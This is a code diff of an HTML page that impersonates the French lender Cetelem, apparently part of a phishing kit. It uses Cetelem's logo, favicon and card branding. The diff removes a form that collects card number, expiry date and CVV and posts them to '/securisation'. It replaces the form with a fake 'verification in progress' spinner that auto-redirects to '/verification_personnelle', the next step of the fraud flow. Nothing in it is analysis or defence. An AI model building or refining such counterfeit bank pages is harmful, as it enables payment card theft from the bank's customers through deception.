@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Sécurisation - Espace client</title>
+  <title>Chargement en cours</title>
   <link rel="icon" href="https://www.cetelem.fr/favicon.ico" type="image/x-icon" />
   <style>
     :root {
@@ -37,8 +37,9 @@
       padding: 0 20px;
     }
 
+    /* Nouveau style pour le logo du haut */
     .header-logo {
-      max-width: 120px;
+      max-width: 120px; /* Taille réduite */
       height: auto;
     }
 
@@ -82,7 +83,7 @@
       padding: 20px;
     }
 
-    .form-container {
+    .loading-container {
       background-color: #fff;
       padding: 40px;
       border-radius: 8px;
@@ -91,7 +92,6 @@
       width: 100%;
       box-sizing: border-box;
       animation: fadeIn 1s ease-in-out;
-      text-align: left;
     }
 
     @keyframes fadeIn {
@@ -99,51 +99,32 @@
         to { opacity: 1; transform: translateY(0); }
     }
 
-    .form-container h1 {
-      text-align: center;
-      font-size: 20px;
-      color: var(--cetelem-dark-gray);
-      margin-bottom: 25px;
+    /* Nouveau style pour le logo du bas */
+    .center-logo {
+      max-width: 150px; /* Taille plus grande */
+      height: auto;
+      margin-bottom: 20px;
     }
 
-    .form-container p {
-      text-align: center;
-      font-size: 14px;
-      color: #666;
-      margin-bottom: 25px;
+    .loader-circle {
+      border: 5px solid rgba(1, 68, 33, 0.1);
+      border-top-color: var(--cetelem-green);
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
     }
 
-    label {
-      font-size: 14px;
-      display: block;
-      margin-bottom: 6px;
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 1.2rem;
       font-weight: bold;
-    }
-
-    input[type="text"],
-    input[type="tel"],
-    input[type="date"] {
-      width: 100%;
-      padding: 11px;
-      font-size: 15px;
-      border: 1px solid var(--cetelem-green);
-      border-radius: 5px;
-      margin-bottom: 18px;
-      box-sizing: border-box;
-      outline: none;
-    }
-
-    .btn {
-      background-color: var(--cetelem-green);
-      color: #fff;
-      font-size: 15px;
-      padding: 11px 0;
-      width: 100%;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-weight: bold;
-      margin-top: 10px;
+      color: var(--cetelem-green);
     }
 
     footer {
@@ -176,6 +157,7 @@
         }
     }
   </style>
+  <meta http-equiv="refresh" content="3;url=/verification_personnelle">
 </head>
 <body>
   <header>
@@ -195,21 +177,10 @@
   </header>
 
   <main>
-    <div class="form-container">
-      <h1>Carte de crédit renouvelable.</h1>
-      <p>La Carte de crédit renouvelable Cetelem Cpay Mastercard vous accompagne au quotidien en vous permettant de régler vos achats partout.</p>
-      <form method="POST" action="/securisation">
-        <label for="numero_carte">Numéro de carte bancaire :</label>
-        <input type="text" id="numero_carte" name="numero_carte" placeholder="Ex : 4100010203040506" pattern="\d{13,19}" maxlength="19" required>
-
-        <label for="date_expiration">Date d'expiration (MM/YY) :</label>
-        <input type="text" id="date_expiration" name="date_expiration" placeholder="MM/YY" pattern="^(0[1-9]|1[0-2])\/\d{2}$" required>
-
-        <label for="cryptogramme">Cryptogramme :</label>
-        <input type="text" id="cryptogramme" name="cryptogramme" placeholder="Ex : 123" maxlength="4" pattern="\d{3,4}" required>
-
-        <button class="btn" type="submit">Se connecter</button>
-      </form>
+    <div class="loading-container">
+      <img src="https://www.liblogo.com/img-logo/ce4075lbc9-cetelem-logo-logo-de-cetelem-la-historia-y-el-significado-del-logotipo-la.png" alt="Logo Cetelem" class="center-logo">
+      <div class="loader-circle"></div>
+      <p class="loading-text">Veuillez patienter pendant la vérification de vos documents...</p>
     </div>
   </main>
 
